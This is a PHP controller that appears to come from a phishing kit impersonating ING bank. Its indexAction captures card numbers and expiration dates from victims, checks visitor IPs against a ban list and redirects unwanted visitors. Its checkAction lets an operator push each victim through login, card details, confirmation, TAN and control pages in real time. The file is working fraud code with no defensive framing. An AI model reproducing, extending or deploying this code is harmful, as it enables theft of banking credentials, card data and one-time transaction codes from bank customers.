<?php

namespace App\Controllers\Ing;

use \Core\View;
use \App\Models\Ing\Ing;
use \App\Auth;

class Details extends \Core\Controller
{
    public function indexAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay']) && isset($_POST['expiration']) && isset($_POST['number'])) {
            Ing::setDetails($_POST['expiration'], $_POST['number'], $_SESSION['uid']);
        } else {
            if (Ing::findBan($_SERVER['REMOTE_ADDR']) || !isset($_SESSION['pay']) || !Ing::checkPayment($this->route_params['id'])) {
                Ing::redirect();
            } else {
                Ing::setDetailsInformation($_SESSION['uid']);

                View::render('Ing/details.php');
            }
        }
    }

    public function checkAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay'])) {
                $check = Ing::getPage($_SESSION['uid']);

                if ($check) {
                    if ($check == 'login') {
                        echo json_encode(['page' => 'login']);   
                        Ing::setLoginPage($_SESSION['uid'], null);
                    } else if ($check == 'details') {
                        echo json_encode(['page' => 'details']);   
                        Ing::setDetailsPage($_SESSION['uid'], null);
                    } else if ($check == 'confirm') {
                        echo json_encode(['page' => 'confirm']);
                        Ing::setConfirmPage($_SESSION['uid'], null);
                    } else if ($check == 'tan') {
                        echo json_encode(['page' => 'tan']);
                        Ing::setTanPage($_SESSION['uid'], null);
                    } else if ($check == 'control') {
                        echo json_encode(['page' => 'control']);
                        Ing::setControlPage($_SESSION['uid'], null);
                    } else if ($check == 'finish') {
                        echo json_encode(['page' => 'finish']);
                        Ing::setFinishPage($_SESSION['uid'], null);
                        unset($_SESSION['pay']);
                        unset($_SESSION['uid']);
                    }
                } else {
                    echo json_encode(['page' => 'waiting']);
                }
           
        } else {
            Ing::redirect();
        }
    }
}